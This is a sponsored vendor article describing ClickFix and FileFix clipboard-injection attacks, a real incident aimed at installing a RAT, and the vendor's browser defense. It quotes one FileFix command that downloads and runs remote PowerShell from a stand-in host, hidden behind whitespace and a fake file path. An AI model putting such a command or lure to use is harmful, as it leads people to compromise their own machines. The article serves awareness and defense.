# Inside a Real Clickfix Attack: How This Social Engineering Hack Unfolds

![Cyber mouse](https://www.bleepstatic.com/content/posts/2025/07/30/cyber-click.jpg)

An inside look at a ClickFix campaign and a real-world attack, its next iteration (FileFix), and how to prevent it in its tracks, before device compromise.

## ClickFix: Silent Copying to Clipboard

ClickFix, a deceptive social engineering tactic, is used by threat actors to manipulate unsuspecting users into unwittingly allowing a web page to silently populate the clipboard.

Ultimately, the attacker is attempting to get a user to (unknowingly) execute malicious code, gathered from the browser and quietly placed into the user’s clipboard, on the host machine.

Coined initially as “ClickFix” because the social engineering prompts were telling the user they ought to “fix” a problem with their browser and required the user to click an element, this term is now ascribed to any similar attack, one in which a user clicks an element, the page then populates the victim’s clipboard, and it instructs the user to paste the malicious code into their device’s terminal.

![Images of a ClickFix attack disguised as a CAPTCHA prompt.](https://www.bleepstatic.com/images/news/security/k/keepaware/clickfix/ClickFix_CAPTCHA.jpg)

**Images of a ClickFix attack disguised as a CAPTCHA prompt.**

The above screenshots show an example ClickFix attack. Once the user clicks the fake CAPTCHA, the page silently populates the user’s clipboard with malicious code. It then displays instructions for the user to prove they are human—by pasting (the malicious code) into the Windows Run dialog.

For more information about ClickFix, see our article explaining [the what, why, where, and how of ClickFix](https://keepaware.com/blog/clickfix-the-what-why-where-and-how-of-it-all?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly).

## [Stop ClickFix Attacks Where They Start: In the Browser](https://keepaware.com/request-a-demo?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)

Keep Aware, the purpose-built browser security platform, detects deceptive interactions in real time, right where they happen.

By monitoring clipboard access patterns, flagging suspicious web pages, and disrupting lateral movement techniques like ClickFix, Keep Aware empowers organizations to shut down attacks before they ever leave the browser and reach the host.

[Request a Demo](https://keepaware.com/request-a-demo?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)

## Real-World Attack: Google Result to ClickFix Attempt

A Keep Aware customer recently encountered a ClickFix attack in the wild. While browsing search engine results, the user clicked on a compromised site. This site, injected with malicious JavaScript, delivered a ClickFix prompt, ultimately for the goal of deploying the NetSupportManager RAT backdoor.

The user had clicked on the prompt, allowing the page to populate the clipboard (with malicious PowerShell), and instructing the user to paste into the device’s terminal.

However, Keep Aware identified, blocked, and warned the user of the suspicious commands the page attempted to populate the clipboard with, effectively preventing device compromise.

The video below walks through what visitors experience on this compromised site—a fake CAPTCHA verification frame. Upon clicking the fake CAPTCHA, malicious JavaScript updates the user’s clipboard with malicious PowerShell code and prompts the user to paste it into the Windows Run dialog.

Below is a walkthrough of what would have happened if Keep Aware’s safeguards were not in place to limit the user’s actions and clear the user’s clipboard.

If the social engineering tactic had been successful and no technical controls had been in place, the user would have unknowingly executed malicious PowerShell code.

This kicks of a series of downloads, de-obfuscation, assembling malware on the host machine, and setting up persistence in the user’s Run registry key—enabling the malware to persist on the compromised device and run each time the user logs in to their computer account.

For specific details about this real-world attack, including both the initial download cradle and the subsequent PowerShell code, check out our [step-by-step walkthrough](https://keepaware.com/blog/clickfix-to-remote-access-a-step-by-step-walkthrough?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly).

## Impact: RATs, Stealers, and More

ClickFix attacks use malicious JavaScript, clipboard manipulation, and social engineering to ultimately gain the attacker access from the browser to the host device.

It has been seen on both malicious and compromised web pages and has been used by multiple threat groups to gain access to victim machines, ultimately deploying malware and remote access trojans (RATs), including AsyncRAT, Skuld Stealer, Lumma Stealer, DarkGate malware, DanaBot stealer, and more.

When left undeterred by technical defenses, these seemingly simple clipboard attacks can escalate into full-system compromise, giving threat actors remote control, access to sensitive data, and persistent footholds that are difficult to detect and even harder to remove.

## The Next Gen: FileFix

FileFix is the next iteration, the younger sibling, of ClickFix—another clipboard-manipulation attack designed to trick users into executing code outside the browser context. First documented by security researcher mr.d0x in late June this year, FileFix dupes users into pasting commands directly into File Explorer’s address bar, and threat actors are already adopting this newer technique.

At a glance, the pasted output looks harmless, like a standard Windows file path. But hidden at the start is a malicious command; the "file path" that follows is a comment, disguising the real threat.

```
Powershell.exe -c "iwr malicious[.]site/mal.jpg|iex" #                                                                                          C:\Organization\Internal\Drive\Business-RFP.pdf
```

The full data copied to the user’s clipboard is a malicious PowerShell command ending in a comment containing a file path.

Notice in the image below, how the seemingly harmless file path in the Explorer’s address bar does not show the actual PowerShell is hidden from the user’s view.

![File Explorer, opened by a Chrome tab.](https://www.bleepstatic.com/images/news/security/k/keepaware/clickfix/fileexplore-filefix.jpg)

**File Explorer, opened by a Chrome tab.**

Like ClickFix, the FileFix attack originates in the browser and relies on social engineering, clipboard injection, and user action to cross the boundary between browser and host. FileFix is, at its core, a ClickFix attack specific to using File Explorer.

* Both happen in the browser context.
* Both use the same clipboard population technique.
* Both leverage malicious and compromised websites, blurring the line between trusted and malicious web traffic.
* Both lead to attacker access on the host device.

This means that FileFix can be stopped the same way ClickFix is: with browser-native defenses. Browser security solutions, like Keep Aware, detect clipboard population attempts in real-time and intercept suspicious code before it ever reaches the host device. This is why having policies built into the browser ensures that compromises are kept at bay.

## Browser Security Takes the Main Stage

ClickFix and FileFix attacks reveal a critical blind spot in many security strategies: the browser as a vector for host compromise. These clipboard-based techniques use social engineering and abuse the user's interaction with seemingly legitimate, or even compromised, websites to deliver malicious code.

Without visibility into browser activity or control over clipboard access, traditional defenses miss the early signs. But with browser-native insight and real-time clipboard protection, organizations can intercept these attacks at their source, before any code is executed on the host.

At Keep Aware, we’ve seen firsthand how traditional security tools fall short when it comes to protecting the browser—the primary interface employees rely on and attackers exploit. That’s why we built our platform: to detect and block clipboard manipulation and other browser-based attacks before they can cause real harm.

**Interested in learning more? Feel free to [request a demo here.](https://keepaware.com/request-a-demo?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)**

Additionally, we’re proud to be named one of just [four](https://keepaware.com/blog/keep-aware-named-finalist-in-black-hat-usa-2025-startup-spotlight-competition?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)[ ](https://keepaware.com/blog/keep-aware-named-finalist-in-black-hat-usa-2025-startup-spotlight-competition?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)[Black Hat USA 2025 Startup Spotlight Finalists](https://keepaware.com/blog/keep-aware-named-finalist-in-black-hat-usa-2025-startup-spotlight-competition?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly) for innovation, and we remain committed to redefining how organizations secure and manage the browser—the place where today’s work begins, and where today’s attacks often start.

If you’ll be attending Black Hat USA 2025 next week, watch us take the stage to make our pitch, stop by the Keep Aware booth, or **[schedule time to chat with the team](https://keepaware.com/events/black-hat-usa-2025)** at the event.

_Sponsored and written by [Keep Aware](https://keepaware.com/request-a-demo?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)._